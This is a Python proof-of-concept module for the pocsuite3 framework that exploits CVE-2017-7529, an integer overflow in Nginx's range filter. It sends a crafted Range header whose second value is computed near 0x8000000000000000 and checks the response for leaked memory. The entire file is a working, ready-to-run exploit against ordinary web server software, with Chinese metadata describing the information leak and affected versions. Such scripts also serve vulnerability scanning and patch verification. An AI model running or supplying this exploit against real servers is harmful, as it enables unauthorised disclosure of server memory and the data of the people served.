#!/usr/bin/python
# -*- coding: utf-8 -*-
from pocsuite3.api import POCBase, Output
from pocsuite3.api import register_poc
from pocsuite3.api import requests

VUL_NAME = "CVE-2017-7529"

def poc(url):
    headers = {'User-Agent': "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240"}
    offset = 605
    file_len = len(requests.get(url, headers=headers).content)

    n = file_len + offset
    headers['Range'] = "bytes=-%d,-%d" % (n, 0x8000000000000000 - n)
    res = requests.get(url, headers=headers)
    return True if ('59526062-264' in res.text) else False

class TestPOC(POCBase):
    name = 'CVE-2017-7529'
    vulID = 'CVE-2017-7529'  # https://www.seebug.org/vuldb/ssvid-97912
    author = ['aideyisu']
    vulType = '内存溢出,信息泄露'    #任意文件读取
    version = '1.0'    # default version: 1.0
    references = ['https://www.freebuf.com/articles/terminal/140402.html']
    desc = '''
    在Nginx的range filter中存在整数溢出漏洞，可以通过带有特殊构造的range的HTTP头的恶意请求引发这个整数溢出漏洞，并导致信息泄露
    影响版本: Nginx 0.5.6-1.13.2
           '''
    vulDate = '2020-11-30'
    createDate = '2020-12-07'
    updateDate = '2020-12-07'
    appName = 'Nginx'
    appVersion = '0.5.6-1.13.2'
    appPowerLink = ''
    samples = []

    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify mode'''
        result={}
        if poc(self.url):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url+ 'Nginx_CVE-2017-7529' + ' is exist!'
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output
register_poc(TestPOC)
